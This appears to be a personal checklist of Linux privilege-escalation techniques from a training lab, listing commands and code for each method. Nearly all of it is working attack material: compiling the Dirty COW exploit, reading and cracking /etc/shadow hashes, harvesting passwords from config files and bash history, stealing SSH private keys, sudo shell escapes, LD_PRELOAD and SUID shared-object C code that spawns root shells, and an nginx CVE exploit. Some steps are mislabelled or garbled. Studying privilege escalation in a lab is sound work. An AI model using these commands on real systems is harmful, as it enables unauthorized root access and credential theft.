# Linux privesc

- [ ] ##Privilege Escalation - Kernel Exploits
- Download `linux-exploit-suggester.sh` script: `/linux-exploit-suggester/linux-exploit-suggester.sh`
- Compile and run `dirtycow` exploit:
```bash
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
```
- Change password: `passwd`
- Check user privileges: `id`

- [ ] **Privilege Escalation - Stored Passwords (Config Files)**
- View VPN configuration: `cat /home/user/myvpn.ovpn`
- Note the "auth-user-pass" directive value in the config.
- View OpenVPN auth file: `cat /etc/openvpn/auth.txt`
- Search for passwords in Irssi config: `cat /home/user/.irssi/config | grep -i passw`

- [ ] **Privilege Escalation - Stored Passwords (History)**
- Search for passwords in bash history: `cat ~/.bash_history | grep -i passw`

- [ ] **Privilege Escalation - Weak File Permissions**
- List shadow file permissions: `ls -la /etc/shadow`
- View `/etc/passwd` file: `cat /etc/passwd`
- View `/etc/shadow` file: `cat /etc/shadow`
- Unshadow password file:
```bash
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```
- Use hashcat to crack passwords:
```bash
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

- [ ] **Privilege Escalation - SSH Keys**
- Search for authorized_keys and id_rsa files:
```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
- Set appropriate permissions on id_rsa: `chmod 600 id_rsa`
- Connect using SSH key: `ssh -i id_rsa root@<ip>`

- [ ] **Privilege Escalation - Sudo (Shell Escaping)**
- List sudo permissions: `sudo -l`
- Perform one of the shell escaping techniques:
- Execute nano with a shell:
  ```
  sudo find /bin -name nano -exec /bin/sh \;
  ```
- Use `awk` to spawn a shell:
  ```
  sudo awk 'BEGIN {system("/bin/sh")}'
  ```
- Create an Nmap script for shell execution:
  ```
  echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
  ```
- Execute a shell through sudo vim:
  ```
  sudo vim -c '!sh'
  ```

**Privilege Escalation - Sudo (Abusing Intended Functionality)**
- List sudo permissions: `sudo -l`
- Exploit a program that doesn't exist in ctfobins:
sudo apache2 -f /etc/shadow
- Provide the pasted root hash and crack it with John the Ripper:
echo '[Pasted Root Hash]' > hash.txt
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt

**Privilege Escalation - Sudo (LD_PRELOAD)**
- List sudo permissions: `sudo -l`
- Create a shared object for privilege escalation:
1. Open a text editor and type x.c:
  ```
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  ```
- Compile and load the shared object:
  ```
  gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
  sudo LD_PRELOAD=/tmp/x.so apache2
  ```

**Privilege Escalation - SUID (Shared Object Injection)**
- Find SUID binaries: `find / -type f -perm -04000 -ls 2>/dev/null`
- Trace the `suid-so` binary to locate missing .so file:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
- Create a shared object for privilege escalation:
mkdir /home/user/.config
cd /home/user/.config
- Create and compile a shared object (libcalc.c):
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  static void inject() __attribute__((constructor));
  void inject() {
      system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
  }
  ```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

- Run the SUID binary to escalate privileges:
  ```
  /usr/local/bin/suid-so
  ```

**Privilege Escalation - SUID (Symlinks)**
- Identify installed nginx version: `dpkg -l | grep nginx`
- Exploit a known vulnerability (CVE-2016-1247):
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log

- Restart the system to trigger the exploit: `invoke-rc.d nginx rotate >/dev/null 2>&1`
